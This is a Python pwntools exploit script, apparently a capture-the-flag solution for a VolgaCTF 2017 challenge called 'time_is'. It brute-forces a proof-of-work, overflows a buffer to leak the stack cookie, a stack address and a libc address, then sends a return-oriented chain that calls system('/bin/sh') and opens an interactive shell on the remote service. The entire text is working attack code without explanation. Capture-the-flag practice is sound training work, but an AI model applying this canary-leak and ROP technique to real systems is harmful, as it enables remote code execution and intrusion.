from pwn import *
from itertools import permutations

context.log_level = 'DEBUG'

asdf = ''.join(set(string.printable)-set(['\r', '\n', '\x0c']))
local = False
if not local:
    p = remote('time-is.quals.2017.volgactf.ru', 45678)
    p.recvuntil("'")
    start = p.recv(24)
    p.recv()
    for i in permutations(asdf, 5):
        i = ''.join(i)
        if int(hashlib.sha1(start+i).hexdigest(), 16) & 0x3ffffff == 0x3ffffff:
            print i
            p.sendline(start+i)
            break
else:
    p = process('./time_is')

libc_e = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# Leak stack cookie
p.recvuntil('quit\n')
p.sendline('A'*0x801)
p.recvuntil('\n')
cookie = '\x00'+p.recvuntil('Enter')[:-5]
print "Cookie:", cookie.encode('hex')
assert len(cookie) == 8 and '\n' not in cookie

# Leak stack addr
p.recvuntil('quit\n')
p.sendline('A'*0x828)
p.recvuntil('\n')
stack = p.recvuntil('Enter')[:-5] + '\x00\x00'
print "Stack addr:", hex(u64(stack))

# Leak libc
p.recvuntil('quit\n')
p.sendline('A'*0x840)
p.recvuntil('\n')
libc = p.recvuntil('Enter')[:-5] + '\x00\x00'
print "libc_start_main:", hex(u64(libc)-240)

libc_e.address = (u64(libc)-240) - libc_e.symbols['__libc_start_main']
print "libc base:", hex(libc_e.address)

p.recvuntil('quit\n')

pop_rdi_ret = 0x400B34

binsh = '/bin/sh\x00'

thing = binsh + 'A'*(0x800-len(binsh)) + p64(0) + cookie + p64(0) + p64(0) + p64(0x400b40) + p64(0x400010) + stack + p64(0) + p64(0) + p64(pop_rdi_ret) + p64(u64(stack) - 2336) + p64(libc_e.symbols['system']) + p64(0)
assert '\n' not in thing and ' ' not in thing

p.sendline(thing)
p.recvuntil('quit\n')

p.sendline('q')
p.interactive()
